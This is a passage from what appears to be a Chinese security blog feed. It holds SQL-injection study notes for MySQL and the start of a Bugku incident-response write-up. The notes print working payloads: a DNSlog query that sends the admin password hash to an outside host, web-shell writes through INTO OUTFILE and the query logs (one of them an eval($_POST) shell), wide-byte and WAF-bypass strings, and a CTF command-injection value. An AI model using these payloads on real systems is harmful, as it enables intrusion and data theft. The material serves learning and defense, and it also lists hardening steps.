class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,load_file(CONCAT(<span class="string">&#x27;\\\\&#x27;</span>,(<span class="keyword">SELECT</span> hex(passwd) <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username<span class="operator">=</span><span class="string">&#x27;admin&#x27;</span> LIMIT <span class="number">1</span>),<span class="string">&#x27;.mysql.2fzz61.dnslog.cn\\abc&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">-- Hex编码的目的是减少干扰，域名有一定的规范，有些特殊字符不能带入</span></span><br><span class="line"><span class="comment">-- \\\\转义  →  \\</span></span><br></pre></td></tr></table></figure><h4 id="SMB外带注入"><a href="#SMB外带注入" class="headerlink" title="SMB外带注入"></a>SMB外带注入</h4><p><a href="http://www.moonslow.com/article/smb_sql_injection">http://www.moonslow.com/article/smb_sql_injection</a></p><h4 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h4><h5 id="原理-5"><a href="#原理-5" class="headerlink" title="原理"></a>原理</h5><p>From:<a href="https://cloud.tencent.com/developer/article/1938545">https://cloud.tencent.com/developer/article/1938545</a></p><p>宽字节：如果一个字符的大小是两个字节的，该字符称为宽字节字符</p><p><code>PHP</code>与<code>Mysql</code>之间的交互</p><p><img src="/../images/5917903e25c36c63ec29ad5237c2f7a4.png" alt="img"></p><p>将php的sql语句以<code>character_set_client</code>编码（也就是转为16进制数），再将16进制数以<code>character_set_connection</code>进行编码（也就是转换为url编码），然后以内部操作字符集进行url解码，最后以<code>character_set_results</code>编码输出结果。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">%df%<span class="number">27</span> 浏览器url自动解码===&gt; β<span class="string">&#x27; 转义===&gt;β\&#x27;转为16进制===&gt; 0xdf0x5c0x27 转换为url编码===&gt; %df%5c%27 进行url解码(因为是GBK编码，%df和%5c结合为汉字)===&gt; 運&#x27;</span></span><br></pre></td></tr></table></figure><h5 id="例题-2"><a href="#例题-2" class="headerlink" title="例题"></a>例题</h5><p><code>sql-lab less-32</code></p><p>转义字符</p><p><img src="/../images/image-20230522170722857.png" alt="image-20230522170722857"></p><p>设置编码集</p><p><img src="/../images/image-20230522170750335.png" alt="image-20230522170750335"></p><p>sql语句，单引号闭合</p><p><img src="/../images/image-20230522171701503.png" alt="image-20230522171701503"></p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="operator">%</span><span class="number">27</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230522171728569.png" alt="image-20230522171728569"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?id=<span class="number">1</span>%df%<span class="number">27</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230522171841053.png" alt="image-20230522171841053"></p><h5 id="payload-5"><a href="#payload-5" class="headerlink" title="payload"></a>payload</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1%df&#x27;</span><br></pre></td></tr></table></figure><p>使用 Linux 自带的 iconv 命令进行 UTF 的编码转换</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo \&#x27;|iconv -f utf-8 -t utf-16</span><br><span class="line">echo \&#x27;|iconv -f utf-8 -t utf-32</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230523121013028.png" alt="image-20230523121013028"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1�&#x27;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230523121159948.png" alt="image-20230523121159948"></p><h4 id="order-by-注入"><a href="#order-by-注入" class="headerlink" title="order by 注入"></a>order by 注入</h4><p><a href="https://www.cnblogs.com/1ink/p/15107674.html">https://www.cnblogs.com/1ink/p/15107674.html</a></p><h4 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h4><h5 id="写文件"><a href="#写文件" class="headerlink" title="写文件"></a>写文件</h5><h6 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h6><ul><li><p>高权限</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select user, file_priv from mysql.user; </span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230528210141344.png" alt="image-20230528210141344"></p></li><li><p>知道网站的绝对路径</p></li><li><p><code>secure_fil_priv</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select @@secure_file_priv;</span><br><span class="line">show global variables like &#x27;%secure_file_priv%&#x27;; # show语句要堆叠注入和回显</span><br></pre></td></tr></table></figure></li></ul><p><img src="/../images/image-20230522174929267.png" alt="image-20230522174929267"></p><h6 id="payload-6"><a href="#payload-6" class="headerlink" title="payload"></a>payload</h6><p><strong>基于联合查询</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select *from users where id=1 union select 1,&#x27;&lt;?php phpinfo();?&gt;&#x27;,3 into outfile &#x27;C:\info.php&#x27;;</span><br><span class="line"></span><br><span class="line">select *from users where id=1 union select 1,&#x27;&lt;?php phpinfo();?&gt;&#x27;,3 into  dumpfile &#x27;C:\info2.php&#x27;;</span><br></pre></td></tr></table></figure><p><code>outfile</code>和<code>dumpfile</code>的区别</p><ul><li><code>outfile</code>导出数据支持多行，<code>dumpfile</code>只支持一行</li><li><code>outfile</code>会对数据进行转义，<code>dumpfile</code>不会</li></ul><p>所以使用<code>into dumpfile</code>这个函数来写入二进制文件</p><p><img src="/../images/image-20230522180009679.png" alt="image-20230522180009679"></p><p><strong>非联合查询</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select *from users where id=1 into outfile &#x27;C:\info.php&#x27; fields terminated by &#x27;&lt;?php phpinfo();?&gt;&#x27;;</span><br><span class="line"></span><br><span class="line">select *from users where id=1 into outfile &#x27;C:\info2.php&#x27; lines terminated by &#x27;&lt;?php phpinfo();?&gt;&#x27;;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230522180543767.png" alt="image-20230522180543767"></p><h5 id="写入日志文件"><a href="#写入日志文件" class="headerlink" title="写入日志文件"></a>写入日志文件</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># --查看配置，日志是否开启，和mysql默认log地址(记下原地址方便恢复)</span><br><span class="line">show variables like &#x27;%general%&#x27;;</span><br><span class="line"></span><br><span class="line">set global general_log = on;</span><br><span class="line"></span><br><span class="line">set global general_log_file = &#x27;e:\info.php&#x27;; # 这里日志创建权限要低一些，不能在c盘创建</span><br><span class="line"></span><br><span class="line">select &#x27;&lt;?php phpinfo();?&gt;&#x27;;</span><br><span class="line"></span><br><span class="line">--结束后，痕迹清理</span><br></pre></td></tr></table></figure><p>日志慢查询</p><p>From：<a href="https://wiki.wgpsec.org/knowledge/web/mysql-write-shell.html">https://wiki.wgpsec.org/knowledge/web/mysql-write-shell.html</a></p><blockquote><p>为什么要用慢查询写呢？因为开启日志监测后文件会很大，网站访问量大的话我们写的shell会出错</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show variables like &#x27;%slow_query_log%&#x27;;--查看慢查询信息</span><br><span class="line">set global slow_query_log=1;--启用慢查询日志(默认禁用)</span><br><span class="line">set global slow_query_log_file=&#x27;C:\\phpStudy\\WWW\\shell.php&#x27;;--修改日志文件路径</span><br><span class="line"></span><br><span class="line">show global variables like &#x27;%long_query_time%&#x27;;</span><br><span class="line">--查看默认时间值，当sql语句执行时间超过该值才会被计入日志中，默认10秒</span><br><span class="line"></span><br><span class="line">select &#x27;&lt;?php @eval($_POST[abc]);?&gt;&#x27; or sleep(@@long_query_time+1);--写shell到慢查询日志</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230522182142555.png" alt="image-20230522182142555"></p><h5 id="sqlmap-–os-shell"><a href="#sqlmap-–os-shell" class="headerlink" title="sqlmap  –os-shell"></a>sqlmap  –os-shell</h5><ul><li><p>大致流程</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">获取目标信息→使用lines terminated by将具有文件上传的🐎上传到网站→逐级目录访问找到🐎</span><br><span class="line"></span><br><span class="line">→通过该🐎上传真正的命令🐎→测试命令🐎能否执行→删除上传的两个🐎</span><br></pre></td></tr></table></figure></li><li><p>文件上传🐎：form表单</p></li><li><p>php命令马：获得<code>disable_function</code>，遍历所有代码执行，命令执行函数，判断哪一个不在<code>disable_function</code>。</p></li></ul><h4 id="读文件"><a href="#读文件" class="headerlink" title="读文件"></a>读文件</h4><h5 id="LOAD-DATA-LOCAL—任意读取"><a href="#LOAD-DATA-LOCAL—任意读取" class="headerlink" title="LOAD DATA LOCAL—任意读取"></a><code>LOAD DATA LOCAL</code>—任意读取</h5><h6 id="脚本-1"><a href="#脚本-1" class="headerlink" title="脚本"></a>脚本</h6><p><a href="https://github.com/allyshka/Rogue-MySql-Server">https://github.com/allyshka/Rogue-MySql-Server</a></p><h6 id="原理和攻击思路"><a href="#原理和攻击思路" class="headerlink" title="原理和攻击思路"></a>原理和攻击思路</h6><p><a href="https://paper.seebug.org/1112/">CSS-T | Mysql Client 任意文件读取攻击链拓展</a></p><blockquote><p>文件读取<code>Phar</code>文件，造成php反序列化</p></blockquote><h6 id="条件-1"><a href="#条件-1" class="headerlink" title="条件"></a>条件</h6><ul><li><p>客户端必须启用LOCAL-INFILE </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">连接时参数--local-infile=OFF 可以修复，或者更改全局变量local_infile(我在5.7下参数可以，更改全局变量不行？？)</span><br></pre></td></tr></table></figure></li><li><p>客户端支持非SSL连接</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">连接时参数--ssl-mode=VERIFY_IDENTITY 可以修复</span><br></pre></td></tr></table></figure></li><li><p>目标web存在连接数据库的功能</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">数据库弱口令扫描，连接检查</span><br><span class="line">网站重装漏洞（需要连接数据库）</span><br><span class="line">数据迁移服务</span><br><span class="line">Excle从数据库中同步数据到表格内</span><br></pre></td></tr></table></figure></li></ul><h6 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">客户端与服务端的mysql都是5.7版本</span><br></pre></td></tr></table></figure><p><code>mysql5.7</code>默认开启</p><p><img src="/../images/image-20230523163445312.png" alt="image-20230523163445312"></p><p>注：一开始使用服务端使用8版本不行</p><p>攻击者（服务端）起脚本</p><p><img src="/../images/image-20230523162503899.png" alt="image-20230523162503899"></p><p><img src="/../images/image-20230523162623757.png" alt="image-20230523162623757"></p><p>受害者连接</p><p><img src="/../images/image-20230523162534773.png" alt="image-20230523162534773"></p><p>攻击者查看<code>mysql.log</code></p><p><img src="/../images/image-20230523162727437.png" alt="image-20230523162727437"></p><h5 id="load-file"><a href="#load-file" class="headerlink" title="load_file"></a><code>load_file</code></h5><p><strong>注意：转义字符</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select load_file(&#x27;e:\test.txt&#x27;); # \t 错误路径</span><br><span class="line">select load_file(&#x27;e:\\test.txt&#x27;);# 正确</span><br><span class="line">select load_file(0x653A5C746573742E747874);# 支持十六进制</span><br><span class="line">select load_file(char(101,58,92,116,101,115,116,46,116,120,116));# 支持char函数</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230523134023401.png" alt="image-20230523134023401"></p><h5 id="load-data"><a href="#load-data" class="headerlink" title="load data "></a><code>load data </code></h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">create table user(cmd text)</span><br><span class="line">load data infile &#x27;e:/test.txt&#x27; into table user;</span><br><span class="line">select * from user;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230523134532606.png" alt="image-20230523134532606"></p><p><img src="/../images/image-20230522220456619.png" alt="image-20230522220456619"></p><h4 id="mysqldump"><a href="#mysqldump" class="headerlink" title="mysqldump"></a>mysqldump</h4><p><strong>shell</strong>下执行</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mysqldump -uroot -proot --all-databases &gt; file_path  # 导出所有数据库</span><br><span class="line">mysqldump -uroot -proot --databases db1 --tables a1 a2  &gt; /file_path # 导出db1中的a1、a2表</span><br></pre></td></tr></table></figure><p>导出的文本内容</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">创建数据库判断语句-删除表-创建表-锁表-禁用索引-插入数据-启用索引-解锁表</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230528204837541.png" alt="image-20230528204837541"></p><h5 id="例题-3"><a href="#例题-3" class="headerlink" title="例题"></a>例题</h5><p>CISCN2023初赛–dumpit</p><p>关键代码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$black</span> = <span class="string">&#x27;;`*#^$&amp;|&#x27;</span>;  <span class="comment">#黑名单</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$db</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;db&#x27;</span>];</span><br><span class="line"><span class="variable">$t2d</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;table_2_dump&#x27;</span>];</span><br><span class="line"><span class="variable">$randstr</span> = <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">time</span>());</span><br><span class="line"></span><br><span class="line"><span class="variable">$dump</span>=<span class="string">&#x27;mariadb-dump &#x27;</span>.<span class="variable">$db</span>.<span class="string">&#x27; &#x27;</span>.<span class="variable">$t2d</span>.<span class="string">&#x27; &gt;./log/&#x27;</span>.<span class="variable">$randstr</span>.<span class="string">&#x27;.log&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="variable">$dump</span>);</span><br></pre></td></tr></table></figure><p>db和table都可控，过滤不严谨，并且直接拼接到命令中，造成RCE</p><p>payload</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">?db=ctf&amp;table_2_dump=flag2 %0d%0a cmd</span><br></pre></td></tr></table></figure><h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p>国光师傅✍的太好辣，等到后面学习windows提权再复现吧😋</p><p><a href="https://www.sqlsec.com/2020/11/mysql.html">https://www.sqlsec.com/2020/11/mysql.html</a></p><h4 id="Linux的Mysql–好像没用"><a href="#Linux的Mysql–好像没用" class="headerlink" title="Linux的Mysql–好像没用"></a>Linux的Mysql–好像没用</h4><p><code>help</code>查看<code>mysql</code>帮助</p><p><img src="/../images/image-20230522205545396.png" alt="image-20230522205545396"></p><p>假想：如果存在堆叠注入，就可以以当前数据库用户权限任意命令执行</p><p><img src="/../images/image-20230522205812501.png" alt="image-20230522205812501"></p><p>测试了一下好像不行</p><p><img src="/../images/image-20230522223047561.png" alt="image-20230522223047561"></p><p><strong>并且此方法只能在本地读取，远程连接mysql时使用system，实际上还是在原来的主机上执行命令。</strong></p><p><code>kali</code>连接远程mysql，<code>system uname -a</code></p><p><img src="/../images/image-20230522210207967.png" alt="image-20230522210207967"></p><h2 id="Mysql绕过补充"><a href="#Mysql绕过补充" class="headerlink" title="Mysql绕过补充"></a>Mysql绕过补充</h2><h3 id="通用绕过"><a href="#通用绕过" class="headerlink" title="通用绕过"></a>通用绕过</h3><ul><li><p>大小写绕过</p><p>修复：正则<code>/i</code></p></li><li><p>双写绕过（waf将关键字替换为空，且次数为1）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uniunionon</span><br></pre></td></tr></table></figure><p>修复：正则<code>/m</code></p></li></ul><h3 id="注释符绕过"><a href="#注释符绕过" class="headerlink" title="注释符绕过"></a>注释符绕过</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 手动闭合</span><br><span class="line">$sql=&quot;select * from users where id=&#x27;$id&#x27;;&quot;</span><br><span class="line"></span><br><span class="line">$id=1&#x27; and &#x27;1&#x27;=&#x27;2</span><br><span class="line"></span><br><span class="line">select * from users where id=&#x27;1&#x27; and &#x27;1&#x27;=&#x27;2&#x27;;</span><br></pre></td></tr></table></figure><h3 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h3><ul><li><p><code>%0a</code></p></li><li><p><code>%0d%0a</code></p></li><li><p><code>/**/</code></p></li><li><p>括号绕过</p><blockquote><p>在MySQL中，括号是用来包围子查询的。因此，任何可以计算出结果的语句，都可以用括号包围起来。而括号的两端，可以没有多余的空格。</p></blockquote><p><img src="/../images/image-20230522161003063.png" alt="image-20230522161003063"></p></li></ul><h3 id="引号绕过"><a href="#引号绕过" class="headerlink" title="引号绕过"></a>引号绕过</h3><h4 id="不让用单引号"><a href="#不让用单引号" class="headerlink" title="不让用单引号"></a>不让用单引号</h4><p>可以用十六进制代替</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">where(table_name=&#x27;users&#x27;) → where(table_name=0x7573657273)</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230522163358530.png" alt="image-20230522163358530"></p><h4 id="转义了单引号"><a href="#转义了单引号" class="headerlink" title="转义了单引号"></a>转义了单引号</h4><p>宽字节注入，二次注入</p><h3 id="字符串连接函数"><a href="#字符串连接函数" class="headerlink" title="字符串连接函数"></a>字符串连接函数</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">concat(&quot;str1&quot;, &quot;,&quot; ,&quot;str2&quot;)</span><br><span class="line"></span><br><span class="line">concat_ws(&quot;,&quot; , &quot;str1&quot; , &quot;str2&quot;)</span><br><span class="line"></span><br><span class="line">group_concat(&quot;str1&quot;, &quot;,&quot; ,&quot;str2&quot;)</span><br></pre></td></tr></table></figure><h3 id="select绕过"><a href="#select绕过" class="headerlink" title="select绕过"></a>select绕过</h3><ul><li><p>已知表名可以用<code>handle</code></p></li><li><p>版本&gt;&#x3D;8.0</p><p><a href="https://blog.csdn.net/rfrder/article/details/118726022">mysql 8.0.21以上版本的新特性</a></p></li><li><p>在对当前表的列名注入时，可以直接写字段名，而无需<code>select 该字段 from 该表</code></p><p><img src="/../images/image-20230522161753632.png" alt="image-20230522161753632"></p></li></ul><h3 id="逗号绕过"><a href="#逗号绕过" class="headerlink" title="逗号绕过"></a>逗号绕过</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">substr(databse(),1,1) 等价于 substr(databse() from 1 for 1)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select 1,2,3; 等价于 select * from (select 1)a join (select 2)b join (select 3)c;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20220718092241142.png" alt="image-20220718092241142"></p><h3 id="内联注释"><a href="#内联注释" class="headerlink" title="内联注释"></a>内联注释</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 如果加了!就会执行在/* */内的语句</span><br><span class="line">/*!union select 1,2*/</span><br><span class="line"></span><br><span class="line"># 要将整个语句写入/* */内</span><br><span class="line">/*!union select */1,2 这是错误的</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#  version 5.7.26</span><br><span class="line">/*!00000 select 1,2*/; 可以</span><br><span class="line">/*!50726 select 1,2*/;  可以</span><br><span class="line">/*!50727 select 1,2*/;  不可以</span><br><span class="line"></span><br><span class="line">00000 到 50726之间是可以的</span><br></pre></td></tr></table></figure><h3 id="无列名注入"><a href="#无列名注入" class="headerlink" title="无列名注入"></a>无列名注入</h3><h4 id="场景"><a href="#场景" class="headerlink" title="场景"></a>场景</h4><p><code>information_schem</code>被过滤，不知道表的字段名</p><h4 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h4><p>通过<code>select 数字</code>将字段名设置为数字</p><p><img src="/../images/image-20230523141619236.png" alt="image-20230523141619236"></p><p>再用联合查询将需要的数据存到上图的表中</p><p><img src="/../images/image-20230523141701416.png" alt="image-20230523141701416"></p><p>那么想要查询<code>users</code>表中的<code>username</code>字段的值</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select `2` from (select 1,2,3 union select * from user)别名;</span><br><span class="line"></span><br><span class="line"># 别名是(select 1,2 union select * from user)返回的表的别名</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230523141936080.png" alt="image-20230523141936080"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 如果反引号被过滤</span><br><span class="line">select group_concat(b) from (select 1,2 as b,3 union select * from users)a;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230523142119240.png" alt="image-20230523142119240"></p><h2 id="预编译问题"><a href="#预编译问题" class="headerlink" title="预编译问题"></a>预编译问题</h2><p>推荐阅读：</p><p><a href="https://forum.butian.net/share/1559">奇安信攻防社区-SQL注入&amp;预编译</a></p><p><a href="https://xz.aliyun.com/t/3950">PDO场景下的SQL注入探究 - 先知社区</a></p><h3 id="预编译失效"><a href="#预编译失效" class="headerlink" title="预编译失效"></a>预编译失效</h3><p><code>PHP-PDO</code>采用本地预处理</p><p><img src="/../images/image-20230330172825283.png" alt="image-20230330172825283"></p><p>传入<code>?username=&#39;admin&#39;</code>,查看日志如下</p><blockquote><p>开启永久日志,在配置文件中加入</p><p>general_log &#x3D; 1<br>general_log_file &#x3D; 日志路径</p></blockquote><p><img src="/../images/image-20230330172741664.png" alt="image-20230330172741664"></p><p>可以看到预编译为其自动添加了一对引号，并将用户输入的引号进行转义。</p><p>那么如果将表名，<code>order by xx</code>处进行预编译就会产生如下效果</p><p><img src="/../images/image-20230330001720031.png" alt="image-20230330001720031"></p><p><img src="/../images/image-20230330001733787.png" alt="image-20230330001733787"></p><p>可以看到这些语句”失效了”（没有得到想要的结果），所以在实际开发中，对于这些语句大概率就是进行一个拼接处理，就很可能存在sql注入。</p><h3 id="预编译使用错误"><a href="#预编译使用错误" class="headerlink" title="预编译使用错误"></a>预编译使用错误</h3><ul><li><p><a href="https://www.leavesongs.com/PENETRATION/thinkphp5-in-sqlinjection.html">ThinkPHP5 SQL注入漏洞 &amp;&amp; PDO真&#x2F;伪预处理分析 | 离别歌</a></p></li><li><p>堆叠注入</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$id</span>= <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="comment"># 预处理语句</span></span><br><span class="line"><span class="variable">$stmt</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;select * from users where id=<span class="subst">$id</span>&quot;</span>);</span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line"><span class="variable">$fraction</span> = <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">fetch</span>();</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$fraction</span>);</span><br></pre></td></tr></table></figure><p>使用模拟预编译，并且没有绑定参数</p><p>又因为PDO默认可以支持多条SQL执行，所有造成了堆叠注入。</p></li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1;create database pdo;</span><br></pre></td></tr></table></figure><p>  <img src="/../images/image-20230523131701820.png" alt="image-20230523131701820"></p><h2 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h2><p>sqlmap 源码分析</p><p><img src="/../images/routine.png" alt="img"></p><ul><li><p><a href="https://www.anquanke.com/post/id/262848">sqlmap 项目剖析1</a></p></li><li><p><a href="https://www.anquanke.com/post/id/262847">sqlmap 项目剖析2</a></p></li><li><p><a href="https://www.anquanke.com/post/id/262849">sqlmap 项目剖析3</a></p><p>sqlmap 使用一种极其巧妙的方式组合生成一个完整的 payload，一个完整的 payload 由如下几个部分组成：</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">prefix</span>&gt;</span> <span class="tag">&lt;<span class="name">test</span>&gt;</span> <span class="tag">&lt;<span class="name">comment</span>&gt;</span> <span class="tag">&lt;<span class="name">suffix</span>&gt;</span></span><br></pre></td></tr></table></figure><p>其中 prefix、comment、suffix 作为 boundary，boundary 用于闭合注入点的前后部分；test 则是最终如果闭合成功后必然执行的语句。</p><p>因此 sqlmap 将 prefix 与 suffix 单独作为 boundaries 保存，而 test 和 comment 则根据注入方式和数据库的不同被划分为六个文件（路径：<code>/data/xml/payloads</code>）</p><p><img src="/../images/t01d7dbc46705981404.jpg" alt="img"></p></li><li><p><a href="https://www.anquanke.com/post/id/262850">sqlmap 项目剖析4</a></p><p>布尔注入</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">先发送一个 false 请求，如果结果与原页面相同就判断不存在布尔注入</span><br><span class="line">如果不相同发送一个 true 请求,如果与原页面相似</span><br><span class="line">则再发送一个 false 请求，然后把这两次返回的结果取差集，计算出True时的flag标识，也就是sqlmap的-string参数</span><br></pre></td></tr></table></figure><p>报错注入</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">发送报错payload，如果能够正则匹配到则说明存在报错注入。</span><br></pre></td></tr></table></figure><p>延时注入</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">先发送N个正常请求，然后计算这N个请求响应时间的标准差和正常请求的最长响应时间</span><br><span class="line">然后发送一个延时请求，判断是否在区间内</span><br></pre></td></tr></table></figure><p>联合查询注入</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">用order by和二分法来判断列数</span><br><span class="line">遍历列数判断哪一列是回显点</span><br><span class="line">发送payload</span><br></pre></td></tr></table></figure></li><li><p><a href="https://www.beysec.com/security/sqlmap-source-1.html">sqlmap源码分析与学习</a></p></li><li><p><a href="https://www.processon.com/view/5835511ce4b0620292bd7285">sqlmap 流程脑图</a></p></li></ul><p>os-shell 原理</p><ul><li><a href="https://xz.aliyun.com/t/7942">sqlmap –os-shell原理</a></li><li><a href="https://mp.weixin.qq.com/s?__biz=MzIyMjkzMzY4Ng==&mid=2247485339&idx=1&sn=ea76ee0d56b8a95a118a60d111d48160">Sqlmap之os-shell原理分析</a></li></ul><p>攻防</p><ul><li><a href="https://xz.aliyun.com/t/10385">实战sqlmap绕过WAF</a></li><li><a href="https://www.anquanke.com/post/id/261915">sqlmap –os-shell反制小思路</a></li><li><a href="https://mp.weixin.qq.com/s?__biz=Mzg4MzA4Nzg4Ng==&mid=2247494179&idx=1&sn=e6c94b87981fda009e7be50c9eb73bf6">入侵检测之sqlmap恶意流量分析</a></li></ul><h2 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h2><ul><li><p>正确使用预编译+黑名单</p></li><li><p>配置问题</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">  站库分离</span><br><span class="line">  不允许外连</span><br><span class="line">  数据库以低权限运行</span><br><span class="line">  不显示报错</span><br><span class="line">  不使用多语句查询</span><br><span class="line">  secure_file_priv=NULL</span><br><span class="line">字符集保持一致</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>bugku 应急响应</title>
      <link href="/2023/05/31/bugku%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
      <url>/2023/05/31/bugku%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/</url>
      
        <content type="html"><![CDATA[<h3 id="js劫持"><a href="#js劫持" class="headerlink" title="js劫持"></a>js劫持</h3><p><img src="/../images/image-20230402174621652-1686151030355.png" alt="image-20230402174621652"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat `find /var/www/html -name &quot;6127418cad73c.php&quot;`</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230402174633296-1686151030358.png" alt="image-20230402174633296"></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">find . | xargs grep -ri &#x27;&lt;script type=&quot;text/javascript&quot;&gt;&#x27; -l | sort | uniq -c</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>通过xss的特征内容来定位可疑文件</p><h3 id="反弹shell后门"><a href="#反弹shell后门" class="headerlink" title="反弹shell后门"></a>反弹shell后门</h3><p><img src="/../images/image-20230402180138838-1686151030359.png" alt="image-20230402180138838"></p><p><img src="/../images/image-20230402180201438-1686151030359.png" alt="image-20230402180201438"></p><p>处理：</p><p>删除文件</p><p>杀掉进程</p><h3 id="命令劫持"><a href="#命令劫持" class="headerlink" title="命令劫持"></a>命令劫持</h3><p><img src="/../images/image-20230402180338299-1686151030359.png" alt="image-20230402180338299"></p><h3 id="数据库修复"><a href="#数据库修复" class="headerlink" title="数据库修复"></a>数据库修复</h3><p><a href="https://www.cnblogs.com/richardzhu/p/3318595.html">MySQL之权限管理 - I’m Me! - 博客园</a></p><p><img src="/../images/image-20230402181706798-1686151030359.png" alt="image-20230402181706798"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">revoke file on *.* from &#x27;root&#x27;@&#x27;localhost&#x27;; # 收回文件权限</span><br><span class="line">set global general_log = off; # 不启用日志</span><br><span class="line">flush privileges; # 刷新权限</span><br></pre></td></tr></table></figure><h3 id="用户删除"><a href="#用户删除" class="headerlink" title="用户删除"></a>用户删除</h3><p><img src="/../images/image-20230402183352852-1686151030359.png" alt="image-20230402183352852"></p><p>直接删就完事了</p><h3 id="首次攻击"><a href="#首次攻击" class="headerlink" title="首次攻击"></a>首次攻击</h3><p>筛选了ip和状态码，然后找的。</p><p><img src="/../images/image-20230402190333789-1686151030360.png" alt="image-20230402190333789"></p><p><img src="/../images/image-20230403114840046-1686151030360.png" alt="image-20230403114840046"></p><p><img src="/../images/image-20230403114851126-1686151030360.png" alt="image-20230403114851126"></p><p>发现安装了phpmyadmin，那么很大概率是通过数据库攻入的。</p><p><img src="/../images/image-20230403115435870-1686151030360.png" alt="image-20230403115435870"></p><p>登录phpmyadmin后台查看二进制日志，很明显看出来这个是使用udf创建恶意函数sys_eval提权</p><figure 